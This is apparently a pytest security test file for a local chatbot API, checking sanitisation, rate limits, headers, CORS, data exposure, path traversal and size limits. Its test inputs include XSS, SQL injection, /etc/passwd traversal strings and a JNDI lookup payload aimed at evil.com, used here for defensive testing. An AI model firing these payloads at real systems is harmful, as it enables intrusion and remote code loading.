import pytest
import requests
import time
import json
from unittest.mock import patch

class TestSecurity:
    
    @classmethod
    def setup_class(cls):
        cls.api_base_url = "http://localhost:8002"  # Assumes running from e2e tests
    
    def test_input_sanitization(self):
        """Test input sanitization and validation"""
        malicious_inputs = [
            {"content": "<script>alert('xss')</script>"},
            {"content": "'; DROP TABLE chatbot_messages; --"},
            {"content": "../../etc/passwd"},
            {"content": "${jndi:ldap://evil.com/a}"},
            {"content": "{{7*7}}"},  # Template injection
            {"content": "\x00\x01\x02"},  # Null bytes
        ]
        
        for malicious_input in malicious_inputs:
            response = requests.post(
                f"{self.api_base_url}/chat",
                json=malicious_input,
                timeout=10
            )
            
            # Should either reject or sanitize the input
            if response.status_code == 200:
                data = response.json()
                # Verify response doesn't contain executable code
                assert "<script>" not in data["response"]
                assert "DROP TABLE" not in data["response"]
            else:
                # Input was rejected, which is also acceptable
                assert response.status_code in [400, 422]
    
    def test_rate_limiting_protection(self):
        """Test rate limiting (if implemented)"""
        # Send many requests quickly
        responses = []
        start_time = time.time()
        
        for i in range(50):
            try:
                response = requests.post(
                    f"{self.api_base_url}/chat",
                    json={"content": f"Rate limit test {i}"},
                    timeout=5
                )
                responses.append(response.status_code)
            except requests.RequestException:
                responses.append(500)
        
        duration = time.time() - start_time
        
        # Check if any requests were rate limited
        rate_limited = [code for code in responses if code == 429]
        
        # Either rate limiting is working (some 429s) or all requests succeeded
        # Both are acceptable depending on implementation
        assert len(responses) == 50
        
        if rate_limited:
            print(f"✅ Rate limiting active: {len(rate_limited)} requests limited")
        else:
            print("ℹ️  No rate limiting detected (may not be implemented)")
    
    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information"""
        # Test with invalid JSON
        response = requests.post(
            f"{self.api_base_url}/chat",
            data="invalid json",
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        error_text = response.text.lower()
        
        # Error messages should not contain sensitive info
        sensitive_terms = [
            'password', 'secret', 'key', 'token',
            'database', 'connection', 'host',
            'traceback', 'stack trace'
        ]
        
        for term in sensitive_terms:
            assert term not in error_text, f"Error message contains sensitive term: {term}"
    
    def test_http_security_headers(self):
        """Test HTTP security headers"""
        response = requests.get(f"{self.api_base_url}/health", timeout=10)
        
        # Check for security headers (may not all be implemented)
        security_headers = {
            'x-content-type-options': 'nosniff',
            'x-frame-options': 'DENY',
            'x-xss-protection': '1; mode=block',
            'strict-transport-security': 'max-age=31536000',
           'content-security-policy': None,  # Should exist but value varies
        }
       
        headers_present = 0
        for header, expected_value in security_headers.items():
            if header in response.headers:
                headers_present += 1
                if expected_value:
                    assert response.headers[header] == expected_value
        
        # At least some security headers should be present
        print(f"ℹ️  {headers_present}/{len(security_headers)} security headers present")
   
    def test_cors_configuration(self):
        """Test CORS configuration security"""
        # Test OPTIONS request
        response = requests.options(f"{self.api_base_url}/chat", timeout=10)
        
        if 'access-control-allow-origin' in response.headers:
            origin = response.headers['access-control-allow-origin']
            
            # Warn if CORS is too permissive
            if origin == '*':
                print("⚠️  CORS allows all origins - consider restricting in production")
            else:
                print(f"✅ CORS origin restricted to: {origin}")
    
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure in responses"""
        # Send a message and check response
        response = requests.post(
            f"{self.api_base_url}/chat",
            json={"content": "Test sensitive data exposure"},
            timeout=10
        )
        
        assert response.status_code == 200
        response_text = response.text.lower()
        
        # Check that sensitive data is not exposed
        sensitive_patterns = [
            'password', 'secret', 'key', 'token',
            'aws_access_key', 'aws_secret',
            'database_url', 'connection_string'
        ]
        
        for pattern in sensitive_patterns:
            assert pattern not in response_text, f"Sensitive data exposed: {pattern}"
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        traversal_attempts = [
            "/../../etc/passwd",
            "/message/../../../etc/passwd/sentiment",
            "/message/1/../../../sensitive/file/sentiment"
        ]
        
        for path in traversal_attempts:
            response = requests.get(f"{self.api_base_url}{path}", timeout=10)
            
            # Should return 404 or 422, not 200 with file contents
            assert response.status_code in [404, 422, 400]
            
            # Response should not contain system file contents
            response_text = response.text.lower()
            assert 'root:' not in response_text  # Unix passwd file signature
            assert '/bin/bash' not in response_text
    
    def test_request_size_limits(self):
        """Test request size limits"""
        # Test with very large request
        large_content = "A" * (10 * 1024 * 1024)  # 10MB
        
        try:
            response = requests.post(
                f"{self.api_base_url}/chat",
                json={"content": large_content},
                timeout=30
            )
            
            # Should be rejected due to size
            assert response.status_code in [413, 422, 400]
            
        except requests.exceptions.RequestException:
            # Connection error is also acceptable (server rejected)
            pass
        
        print("✅ Large request size properly handled")